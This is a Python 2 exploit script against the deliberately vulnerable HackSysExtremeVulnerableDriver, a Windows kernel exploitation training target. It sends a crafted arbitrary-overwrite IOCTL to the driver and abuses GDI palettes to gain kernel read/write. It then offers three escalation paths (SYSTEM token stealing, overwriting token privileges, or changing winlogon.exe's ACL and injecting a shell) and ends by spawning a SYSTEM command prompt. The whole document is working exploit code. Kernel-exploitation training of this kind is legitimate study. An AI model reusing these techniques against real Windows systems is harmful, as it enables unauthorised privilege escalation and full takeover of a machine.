from kex import *
from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time

if __name__ == '__main__':
	print "[*] HackSysExtremeVulnerableDriver Arbitrary Overwrite privilige escalation"
	
	IOCTL_VULN	= 0x0022200b # 
	DEVICE_NAME   = "\\\\.\\HackSysExtremeVulnerableDriver"
	dwReturn	  = c_ulong()
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
	if driver_handle == INVALID_HANDLE_VALUE:
		print "[-] Coudn't open driver, exiting..."
		sys.exit(-1)

	print "[!] Chose exploit method:"
	print "\t[1] Do tokenstealing with PALETTEs"
	print "\t[2] Overwrite token privileges with PALETTEs and inject into winlogon.exe"
	print "\t[3] Change ACL of winlogon.exe with PALETTEs and inject into winlogon.exe"
	choice = raw_input("[!] Type 1 or 2 or 3 and press enter: ")
	if choice not in ['1','2','3']:
		print "[-] 1 or 2 or 3, not something else, start over..."
		sys.exit(-1)
	
	(what, where, manager_palette_handle, worker_palette_handle) = get_www_address_and_palettes()
	input = struct.pack("<Q", addressof(what)) 
	input += struct.pack("<Q", where) 

	inputbuffer = id(input) + 32
	print "[*] Input buffer is at: %s" % hex(inputbuffer)
	inputbuffer_size  = len(input)
	outputbuffer_size = 0x0
	IoStatusBlock = c_ulong()
	print "[*] Talking to the driver sending vulnerable IOCTL..."
	dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
								   None,
								   None,
								   None,
								   byref(IoStatusBlock),
								   IOCTL_VULN,
								   inputbuffer,
								   inputbuffer_size,
								   None,
								   0x0
								   )
	if choice == '1':
		tokenstealing_with_palettes(manager_palette_handle, worker_palette_handle)
		if shell32.IsUserAnAdmin():
			print "[+] We got SYSTEM!!"
			os.system('cmd.exe')
		else:
			print "[-] Something went wrong with the exploit, no SYSTEM"
	elif choice == '2':
		privilege_with_palettes(manager_palette_handle, worker_palette_handle)
		inject_shell(manager_palette_handle, worker_palette_handle)
	elif choice == '3':
		acl_with_palettes(manager_palette_handle, worker_palette_handle, "winlogon.exe")
		inject_shell(manager_palette_handle, worker_palette_handle)
